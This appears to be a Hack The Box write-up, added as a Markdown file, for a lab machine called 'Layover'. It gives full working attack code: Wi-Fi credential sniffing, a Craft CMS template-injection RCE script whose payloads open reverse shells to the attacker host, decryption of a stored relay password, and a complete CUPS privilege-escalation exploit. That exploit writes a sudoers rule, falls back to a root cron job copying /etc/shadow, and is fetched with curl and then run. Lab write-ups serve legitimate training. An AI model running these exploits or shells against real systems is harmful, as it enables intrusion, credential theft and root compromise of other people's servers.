@@ -1,0 +1,684 @@
+# Layover — Full Walkthrough
+
+A step-by-step guide to owning Layover from start to finish. Written so that someone new to Hack The Box can follow every command. Read the short explanation above each block before running it.
+
+Replace IP addresses with whatever your instance actually shows. In this run the RDP box was `10.129.3.203` and the internal Wi-Fi network turned out to be `10.13.37.0/24`, but yours may differ.
+
+---
+
+## Overview of the whole chain
+
+Before diving in, here is the map of what we are going to do, so each step makes sense:
+
+1. Connect to the box over RDP with the credentials we were given.
+2. Discover the box is a Linux workstation with two wireless cards.
+3. Become root on this workstation (easy: it has full sudo).
+4. Connect the wireless card to an open Wi-Fi network. This puts us on a second, internal network.
+5. On that internal network there is a web portal (Craft CMS) and a staff "bot" that logs into it.
+6. Sniff the wireless traffic and capture the staff bot's login (cleartext HTTP) to get a real username and password.
+7. Use those credentials to log into Craft CMS.
+8. Exploit a Craft CMS vulnerability to get code execution on the portal server.
+9. Decrypt a stored mail-relay password using Craft's own security key. That gives us the password for the user `aporter`.
+10. SSH in as `aporter` and read the user flag.
+11. Exploit a CUPS (printing service) vulnerability to escalate from `aporter` to root and read the root flag.
+
+---
+
+## Starting credentials
+
+We are given:
+
+```
+username: contractor
+password: Contractor2026!
+```
+
+---
+
+## Step 1 — Connect over RDP
+
+The box exposes SSH (22) and RDP (3389). We connect with RDP first. On modern FreeRDP the flag for clipboard is `+clipboard` (not `+copy-clipboard`, which throws an error).
+
+```bash
+xfreerdp3 /v:10.129.3.203 /u:contractor /p:'Contractor2026!' +clipboard /dynamic-resolution /cert:ignore
+```
+
+If your system uses the older binary, `xfreerdp` works with the same options.
+
+This drops you into a Linux desktop. Open the Terminal application inside it.
+
+---
+
+## Step 2 — Look around the workstation
+
+Check the network interfaces. The important thing here is that the machine has two wireless cards (`wlan2`, `wlan3`) in addition to the normal wired `eth0`.
+
+```bash
+ip a
+```
+
+Confirm the OS and who we are:
+
+```bash
+uname -a
+id
+```
+
+You will see the hostname is `airside-ws01`, it is Ubuntu 24.04, and you are the `contractor` user.
+
+---
+
+## Step 3 — Become root on the workstation
+
+Check what sudo rights `contractor` has:
+
+```bash
+sudo -l
+```
+
+The output shows `contractor` may run any command as any user. So we simply switch to root:
+
+```bash
+sudo su -
+```
+
+Enter the password `Contractor2026!` when prompted.
+
+You are now root on `airside-ws01`. This root is only on the entry workstation, not the final goal. The real target lives on the other network reachable through Wi-Fi.
+
+---
+
+## Step 4 — Scan for Wi-Fi networks
+
+Scan the airwaves with one of the wireless cards. We will use `wlan2` to connect and keep `wlan3` free for sniffing.
+
+```bash
+nmcli dev wifi list
+```
+
+You will see one network:
+
+```
+SSID:     HTB International WiFi
+SECURITY: --  (this means it is OPEN, no password)
+CHANNEL:  6
+```
+
+Because it is open, there is nothing to crack. We just connect to it.
+
+---
+
+## Step 5 — Connect to the open Wi-Fi
+
+Turn Wi-Fi on and connect `wlan2` to the open network:
+
+```bash
+nmcli radio wifi on
+nmcli dev set wlan2 managed yes
+nmcli dev wifi connect "HTB International WiFi" ifname wlan2
+```
+
+Check that you got an IP address on a new network:
+
+```bash
+ip addr show wlan2
+ip route
+```
+
+In this run `wlan2` received `10.13.37.182/24`, and the gateway was `10.13.37.1`. That `10.13.37.0/24` network is our new hunting ground.
+
+---
+
+## Step 6 — Find what is on the new network
+
+Look at the DNS resolver config and resolve the airport hostnames. The machine already knows about two hosts.
+
+```bash
+cat /etc/resolv.conf
+getent hosts portal.international.htb wifi.international.htb
+```
+
+This gives you:
+
+```
+10.13.37.10   portal.international.htb    (the web portal - our target)
+10.13.37.1    wifi.international.htb      (the Wi-Fi captive gateway)
+```
+
+Look at the portal's login page:
+
+```bash
+curl -s -i http://portal.international.htb/miles/ | head -40
+```
+
+It is an "HTB Airways Miles" member sign-in page (Craft CMS). There is also a notice, seen on the captive portal, that says airport staff should "sign in periodically" to this Miles portal. That is a big hint: a staff account regularly logs in over this network.
+
+---
+
+## Step 7 — Confirm a second client is on the Wi-Fi
+
+We want to sniff the staff login. First, put the second wireless card (`wlan3`) into monitor mode so it can watch all raw wireless traffic. Then look at which devices are talking.
+
+```bash
+ip link set wlan3 down
+iw dev wlan3 set type monitor
+ip link set wlan3 up
+iw dev wlan3 set channel 6
+```
+
+Now capture 30 seconds of raw wireless data frames and see which MAC addresses are active:
+
+```bash
+tshark -i wlan3 -a duration:30 -Y 'wlan.fc.type==2' -T fields -e wlan.sa -e wlan.da 2>/dev/null | sort | uniq -c | sort -rn | head
+```
+
+You will see a third device (a MAC like `c2:95:6e:e8:cc:83`) that is not you and not the access point. That is the staff client. Its IP turned out to be `10.13.37.132`.
+
+---
+
+## Step 8 — Capture the staff login (the key step)
+
+Because the Wi-Fi is open, all its traffic is unencrypted. The staff client periodically sends an HTTP POST to the Miles login page containing a username and password in cleartext. We capture it with `tshark` in monitor mode, decoding HTTP POST form fields.
+
+Run this and wait for the full duration. Do not cancel early — the staff login is periodic and you must catch one cycle.
+
+```bash
+iw dev wlan3 set channel 6
+tshark -i wlan3 -a duration:120 -Y 'http.request.method=="POST"' -T fields -e ip.src -e http.request.full_uri -e urlencoded-form.key -e urlencoded-form.value 2>/dev/null
+```
+
+When the staff bot fires, you get a line like:
+
+```
+10.13.37.132   http://portal.international.htb/miles/login.php   username,password   jenny,Fl1ghtDeck2026!
+```
+
+You now have real credentials:
+
+```
+username: jenny
+password: Fl1ghtDeck2026!
+```
+
+---
+
+## Step 9 — Log into the Craft CMS admin panel
+
+Open a browser inside the RDP desktop and go to:
+
+```
+http://portal.international.htb/admin
+```
+
+Log in with `jenny` / `Fl1ghtDeck2026!`.
+
+You land in the Craft CMS control panel. Under **Utilities → System Report** you can see the version: **Craft CMS 5.9.8**, running from `/var/www/portal`, and a custom module named `htbairways`.
+
+Note: `jenny` is a low-privilege user. Trying to reach **Settings → Sections** gives "Unauthorized" because admin changes are locked down. That is fine — we do not need the settings pages.
+
+---
+
+## Step 10 — Get code execution on the portal (Craft CMS RCE)
+
+Craft CMS 5.9.8 is vulnerable to an authenticated Server-Side Template Injection through the `element-search` endpoint (a Yii gadget chain that runs shell commands). Any logged-in user can trigger it, which is exactly what `jenny` is.
+
+First, start a listener on the workstation (`airside-ws01`) to catch a reverse shell. Its Wi-Fi IP is `10.13.37.182`:
+
+```bash
+nc -lvnp 4444
+```
+
+Now save this exploit script on the box. It logs in as `jenny`, then sends the malicious search request that runs a command. It tries a few reverse-shell one-liners.
+
+```python
+import requests, re
+base='http://portal.international.htb'
+s=requests.Session()
+s.headers.update({'User-Agent':'Mozilla/5.0'})
+r=s.get(base+'/admin/login', timeout=10)
+csrf=re.search(r'name="CRAFT_CSRF_TOKEN" value="([^"]+)"', r.text.replace('\\"','"')).group(1)
+s.post(base+'/index.php?p=admin/actions/users/login', json={'CRAFT_CSRF_TOKEN':csrf,'loginName':'jenny','password':'Fl1ghtDeck2026!'}, headers={'X-CSRF-Token':csrf,'X-Requested-With':'XMLHttpRequest','Accept':'application/json'}, timeout=10)
+r2=s.get(base+'/admin/dashboard', timeout=10)
+csrf2=re.search(r'csrfTokenValue":"([^"]+)"', r2.text).group(1)
+for cmd in ['bash -c "bash -i >& /dev/tcp/10.13.37.182/4444 0>&1"','busybox nc 10.13.37.182 4444 -e /bin/bash','ncat 10.13.37.182 4444 -e /bin/bash']:
+    payload={"elementType":"craft\\elements\\Category","siteId":1,"search":"","condition":{"class":"craft\\elements\\conditions\\ElementCondition","elementType":"craft\\elements\\Category","fieldLayouts":[{"as rce":{"__class":"yii\\behaviors\\AttributeTypecastBehavior","__construct()":[{"attributeTypes":{"typecastBeforeSave":["Psy\\Readline\\Hoa\\ConsoleProcessus","execute"]},"typecastBeforeSave":cmd}]} ,"on *":"self::beforeSave"}]},"CRAFT_CSRF_TOKEN":csrf2}
+    try:
+        pr=s.post(base+'/index.php?p=admin/actions/element-search/search', json=payload, headers={'X-CSRF-Token':csrf2,'X-Requested-With':'XMLHttpRequest','Accept':'application/json'}, timeout=8)
+        print(cmd, pr.status_code)
+    except Exception as e:
+        print(cmd, 'timeout/hang (maybe shell popped)', type(e).__name__)
+```
+
+Save it as `craft_rce.py` and run it on the workstation:
+
+```bash
+python3 craft_rce.py
+```
+
+Your `nc` listener should catch a shell. Confirm who you are:
+
+```bash
+id
+```
+
+You are `www-data` on `portal` (`10.13.37.10`).
+
+---
+
+## Step 11 — Find the encrypted mail-relay password
+
+The custom `htbairways` module sends member emails through a mail relay. Its settings, including an encrypted password, are stored in the database. Read them from a database backup that also exists, or straight from the config.
+
+First look at the environment file to get the Craft security key and DB credentials:
+
+```bash
+cat /var/www/portal/.env
+```
+
+Key values you will see:
+
+```
+CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
+CRAFT_DB_USER=craftuser
+CRAFT_DB_PASSWORD=CraftDB_pw_2026
+```
+
+The mail-relay settings live in the `htbairways_settings` database table. The relevant rows are:
+
+```
+mailRelayUser     = aporter
+mailRelayHost     = mail.htbairways.htb
+mailRelayPassword = u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=
+```
+
+The password is not plaintext. It is encrypted with Craft's security key.
+
+---
+
+## Step 12 — Decrypt the mail-relay password
+
+Craft can decrypt its own values because it holds the security key. We write a tiny PHP script that boots Craft and calls its decryption function on the blob.
+
+From the `www-data` shell:
+
+```bash
+cd /var/www/portal
+cat > /tmp/d.php <<'EOF'
+<?php
+define('CRAFT_BASE_PATH', '/var/www/portal');
+require '/var/www/portal/vendor/autoload.php';
+$dotenv = Dotenv\Dotenv::createImmutable('/var/www/portal');
+$dotenv->safeLoad();
+$app = require '/var/www/portal/vendor/craftcms/cms/bootstrap/console.php';
+$blob = 'u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=';
+echo $app->getSecurity()->decryptByKey(base64_decode($blob), $app->getConfig()->getGeneral()->securityKey ?? getenv('CRAFT_SECURITY_KEY')) . "\n";
+EOF
+php /tmp/d.php
+```
+
+Output:
+
+```
+Skyp0rt_Relay!26
+```
+
+That is the password for the user `aporter`:
+
+```
+username: aporter
+password: Skyp0rt_Relay!26
+```
+
+---
+
+## Step 13 — SSH in as aporter and read the user flag
+
+The portal box (`10.13.37.10`) is only reachable through the workstation. SSH to it from the `airside-ws01` terminal (the one that has the Wi-Fi route), not from your own attacking machine.
+
+```bash
+ssh aporter@10.13.37.10
+```
+
+Enter `Skyp0rt_Relay!26`. Then read the user flag:
+
+```bash
+id
+cat ~/user.txt
+```
+
+---
+
+## Step 14 — Escalate to root (CUPS local privilege escalation)
+
+The box runs the CUPS printing service as root (version 2.4.16). This version has a local privilege escalation (CVE-2026-34990). In short:
+
+- An unprivileged user can trick CUPS into leaking an internal "Local" admin token by pointing a temporary printer at a fake print server we run on localhost.
+- With that token, we can create a printer whose output device is a `file://` path (which the normal policy would block).
+- Printing to that printer makes root write our chosen content to that file. We use it to drop a sudoers rule that grants `aporter` full sudo.
+
+Save the following exploit as `exploit.py`. It is already tuned for `aporter`. It sets up a small fake IPP server, captures the token, drops a sudoers file, and falls back to a root cron job if needed.
+
+```python
+#!/usr/bin/env python3
+import gzip
+import socket
+import struct
+import subprocess
+import sys
+import threading
+import time
+
+ATTACKER = "aporter"
+CAPTURE_HOST, CAPTURE_PORT = "127.0.0.1", 9189
+IPP_HOST, IPP_PORT = "127.0.0.1", 631
+
+T_OP, T_PRINTER, T_END = 0x01, 0x04, 0x03
+T_INT, T_BOOL, T_NAME, T_KEYWORD = 0x21, 0x22, 0x42, 0x44
+T_URI, T_CHARSET, T_LANG, T_MIME = 0x45, 0x47, 0x48, 0x49
+OP_PRINT_JOB, OP_RESUME_PRINTER = 0x0002, 0x0011
+OP_ADD_MODIFY_PRINTER, OP_ACCEPT_JOBS, OP_CREATE_LOCAL_PRINTER = 0x4003, 0x4008, 0x4028
+
+
+def a(tag, name, val):
+    n, v = name.encode(), val.encode()
+    return bytes([tag]) + struct.pack(">H", len(n)) + n + struct.pack(">H", len(v)) + v
+
+
+def ab(name, val):
+    return a_raw(T_BOOL, name, b"\x01" if val else b"\x00")
+
+
+def a_raw(tag, name, v):
+    n = name.encode()
+    return bytes([tag]) + struct.pack(">H", len(n)) + n + struct.pack(">H", len(v)) + v
+
+
+def req(op, rid, oa, pa=None, doc=b""):
+    p = bytearray(struct.pack(">BBHI", 2, 0, op, rid))
+    p.append(T_OP)
+    for x in oa:
+        p.extend(x)
+    if pa:
+        p.append(T_PRINTER)
+        for x in pa:
+            p.extend(x)
+    p.append(T_END)
+    p.extend(doc)
+    return bytes(p)
+
+
+def post(res, body, auth=None, timeout=4.0):
+    h = [f"POST {res} HTTP/1.1", f"Host: {IPP_HOST}:{IPP_PORT}", "Content-Type: application/ipp",
+         f"Content-Length: {len(body)}", "Connection: close"]
+    if auth:
+        h.append(f"Authorization: Local {auth}")
+    r = ("\r\n".join(h) + "\r\n\r\n").encode("latin1") + body
+    with socket.create_connection((IPP_HOST, IPP_PORT), timeout=timeout) as s:
+        s.settimeout(timeout)
+        s.sendall(r)
+        buf = bytearray()
+        while b"\r\n\r\n" not in buf:
+            c = s.recv(65536)
+            if not c:
+                break
+            buf.extend(c)
+        hh, _, rest = bytes(buf).partition(b"\r\n\r\n")
+        cl = 0
+        for ln in hh.split(b"\r\n"):
+            if ln.lower().startswith(b"content-length:"):
+                cl = int(ln.split(b":", 1)[1].strip())
+        pl = bytearray(rest)
+        while len(pl) < cl:
+            c = s.recv(65536)
+            if not c:
+                break
+            pl.extend(c)
+        sl = hh.split(b"\r\n", 1)[0].split()
+        return (int(sl[1]) if len(sl) > 1 else 0), bytes(pl[:cl] if cl else pl)
+
+
+def st(p):
+    return struct.unpack(">H", p[2:4])[0] if len(p) >= 4 else -1
+
+
+def common():
+    return [a(T_CHARSET, "attributes-charset", "utf-8"),
+            a(T_LANG, "attributes-natural-language", "en"),
+            a(T_NAME, "requesting-user-name", ATTACKER)]
+
+
+def admin(tok, op, rid, name, pa=None):
+    c, p = post("/admin/", req(op, rid, common() + [a(T_URI, "printer-uri",
+               f"ipp://localhost:631/printers/{name}")], pa), auth=tok)
+    return c, st(p)
+
+
+def print_job(name, rid, payload):
+    c, p = post(f"/printers/{name}", req(OP_PRINT_JOB, rid,
+               common() + [a(T_URI, "printer-uri", f"ipp://localhost:631/printers/{name}"),
+                           a(T_MIME, "document-format", "application/vnd.cups-raw"),
+                           a(T_KEYWORD, "compression", "gzip"),
+                           a(T_NAME, "job-name", "pwn")], doc=gzip.compress(payload)))
+    return c, st(p)
+
+
+class Cap(threading.Thread):
+    def __init__(self, port):
+        super().__init__(daemon=True)
+        self.port, self.token = port, None
+
+    def run(self):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.bind((CAPTURE_HOST, self.port))
+            s.listen(5)
+            s.settimeout(0.2)
+            end = time.time() + 25
+            while time.time() < end and not self.token:
+                try:
+                    c, _ = s.accept()
+                except socket.timeout:
+                    continue
+                with c:
+                    d = b""
+                    c.settimeout(5)
+                    while b"\r\n\r\n" not in d:
+                        x = c.recv(4096)
+                        if not x:
+                            break
+                        d += x
+                    tok = None
+                    for ln in d.decode("latin1", "replace").splitlines():
+                        if ln.lower().startswith("authorization: local "):
+                            tok = ln.split(None, 2)[2]
+                    if tok:
+                        self.token = tok
+                        ipp = (b"\x02\x00\x00\x00\x00\x00\x00\x01\x01"
+                               b"\x47\x00\x12attributes-charset\x00\x05utf-8"
+                               b"\x48\x00\x1battributes-natural-language\x00\x02en\x03")
+                        c.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: application/ipp\r\nContent-Length: "
+                                   + str(len(ipp)).encode() + b"\r\nConnection: close\r\n\r\n" + ipp)
+                    else:
+                        c.sendall(b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Local trc=\"y\"\r\n"
+                                  b"Content-Length: 0\r\nConnection: close\r\n\r\n")
+
+
+def drop(tok, tag, path, payload, tries=12):
+    for i in range(tries):
+        name = f"{tag}{i}{time.time_ns() % 100000}"
+        c, s = admin(tok, OP_ADD_MODIFY_PRINTER, 100 + i, name, [
+            a(T_URI, "device-uri", f"file://{path}"),
+            a(T_NAME, "printer-name", name),
+            a(T_NAME, "ppd-name", "raw"),
+            ab("printer-is-temporary", False),
+            ab("printer-is-accepting-jobs", True),
+            a_raw(T_INT, "printer-state", struct.pack(">i", 3)),
+        ])
+        admin(tok, OP_ACCEPT_JOBS, 300 + i, name)
+        admin(tok, OP_RESUME_PRINTER, 400 + i, name)
+        pc, ps = print_job(name, 500 + i, payload)
+        print(f"    [{tag}] queue add 0x{s:04x} / print HTTP {pc} 0x{ps:04x}", flush=True)
+        time.sleep(1.0)
+
+
+def is_root():
+    r = subprocess.run(["sudo", "-n", "/bin/sh", "-c", "id"], capture_output=True, text=True)
+    return r.returncode == 0, (r.stdout + r.stderr).strip()
+
+
+def main():
+    cap = Cap(CAPTURE_PORT)
+    cap.start()
+    time.sleep(0.4)
+    body = req(OP_CREATE_LOCAL_PRINTER, 3,
+               common() + [a(T_URI, "printer-uri", "ipp://localhost:631/")],
+               [a(T_NAME, "printer-name", "tokenleak"),
+                a(T_URI, "device-uri", f"ipp://{CAPTURE_HOST}:{CAPTURE_PORT}/ipp/print")])
+    raw = (f"POST / HTTP/1.1\r\nHost: {IPP_HOST}:{IPP_PORT}\r\nContent-Type: application/ipp\r\n"
+           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode("latin1") + body
+    s = socket.create_connection((IPP_HOST, IPP_PORT), timeout=4)
+    s.sendall(raw)
+    s.settimeout(2)
+    try:
+        s.recv(4096)
+    except Exception:
+        pass
+    s.close()
+    cap.join(timeout=20)
+    if not cap.token:
+        print("[-] no token"); return 1
+    tok = cap.token
+    print("[+] Local token:", tok, flush=True)
+
+    print("[*] step 1: write sudoers fragment", flush=True)
+    drop(tok, "sw", "/etc/sudoers.d/aporter-pwn",
+         f"{ATTACKER} ALL=(ALL) NOPASSWD: ALL\n".encode())
+    ok, out = is_root()
+    print(f"[*] sudo -n id -> rc_ok={ok} :: {out}", flush=True)
+    if ok:
+        print("[+] ROOT via sudoers", flush=True)
+        return 0
+
+    print("[*] step 2: fallback /etc/cron.d", flush=True)
+    drop(tok, "cw", "/etc/cron.d/aporter-pwn",
+         f"* * * * * root cp /etc/shadow /tmp/shadow-{ATTACKER} 2>/dev/null; chmod 644 /tmp/shadow-{ATTACKER}\n".encode())
+    print("[*] waiting up to 90s for cron...", flush=True)
+    for _ in range(90):
+        ok, out = is_root()
+        if ok:
+            print("[+] ROOT via cron", flush=True)
+            return 0
+        if subprocess.run(["test", "-f", f"/tmp/shadow-{ATTACKER}"]).returncode == 0:
+            print("[+] cron payload executed (root-owned /tmp/shadow-%s)" % ATTACKER, flush=True)
+            return 0
+        time.sleep(1)
+    print("[-] no root yet", flush=True)
+    return 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
+
+### Getting the script onto the box without corruption
+
+Terminal paste (especially through tmux) often mangles long scripts. The reliable way is to host the file on the workstation and download it on the portal box.
+
+On `airside-ws01` (root), put `exploit.py` in a folder and serve it:
+
+```bash
+python3 -m http.server 8000
+```
+
+On the portal box (your `aporter` SSH session), download and run it:
+
+```bash
+curl -s http://10.13.37.182:8000/exploit.py -o /tmp/exploit.py
+python3 /tmp/exploit.py
+```
+
+### Expected output
+
+You should see:
+
+```
+[+] Local token: <a token string>
+    [sw] queue add 0x0000 / print HTTP 200 0x....
+[+] ROOT via sudoers
+```
+
+---
+
+## Step 15 — Get the root flag
+
+Once the exploit reports ROOT via sudoers, `aporter` can run anything as root without a password:
+
+```bash
+sudo -n /bin/bash -p
+id
+cat /root/root.txt
+```
+
+You now have a root shell and the root flag. Box owned.
+
+---
+
+## Quick command summary (the whole chain)
+
+```bash
+# 1. RDP in
+xfreerdp3 /v:10.129.3.203 /u:contractor /p:'Contractor2026!' +clipboard /dynamic-resolution /cert:ignore
+
+# 2-3. Become root on the workstation
+sudo su -          # password: Contractor2026!
+
+# 4-5. Connect to the open Wi-Fi
+nmcli radio wifi on
+nmcli dev set wlan2 managed yes
+nmcli dev wifi connect "HTB International WiFi" ifname wlan2
+
+# 6. Identify the internal hosts
+getent hosts portal.international.htb wifi.international.htb
+
+# 7. Monitor mode on the second card
+ip link set wlan3 down; iw dev wlan3 set type monitor; ip link set wlan3 up; iw dev wlan3 set channel 6
+
+# 8. Capture the staff login (wait the full 120s)
+tshark -i wlan3 -a duration:120 -Y 'http.request.method=="POST"' -T fields -e ip.src -e http.request.full_uri -e urlencoded-form.key -e urlencoded-form.value
+#  -> jenny : Fl1ghtDeck2026!
+
+# 9-10. Log into Craft, then run craft_rce.py (listener: nc -lvnp 4444 on 10.13.37.182)
+python3 craft_rce.py     # -> reverse shell as www-data on 10.13.37.10
+
+# 11-12. Decrypt the mail-relay password with Craft's key
+php /tmp/d.php            # -> Skyp0rt_Relay!26
+
+# 13. SSH as aporter, read user flag
+ssh aporter@10.13.37.10  # password: Skyp0rt_Relay!26
+cat ~/user.txt
+
+# 14-15. CUPS local root
+python3 -m http.server 8000                          # on airside-ws01
+curl -s http://10.13.37.182:8000/exploit.py -o /tmp/exploit.py && python3 /tmp/exploit.py   # on portal
+sudo -n /bin/bash -p
+cat /root/root.txt
+```
+
+---
+
+## Credentials and hosts collected
+
+```
+contractor : Contractor2026!            (given, RDP + local root on airside-ws01)
+jenny      : Fl1ghtDeck2026!            (captured over Wi-Fi; Craft CMS login)
+aporter    : Skyp0rt_Relay!26           (decrypted mail-relay password; SSH user)
+craftuser  : CraftDB_pw_2026            (Craft database user)
+Craft security key: IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
+
+Hosts:
+  airside-ws01              10.129.3.203  (entry, RDP)
+  wlan2 (internal)          10.13.37.182
+  portal.international.htb   10.13.37.10   (Craft CMS)
+  wifi.international.htb     10.13.37.1    (captive gateway)
+  mail.htbairways.htb                     (mail relay hostname)
+```
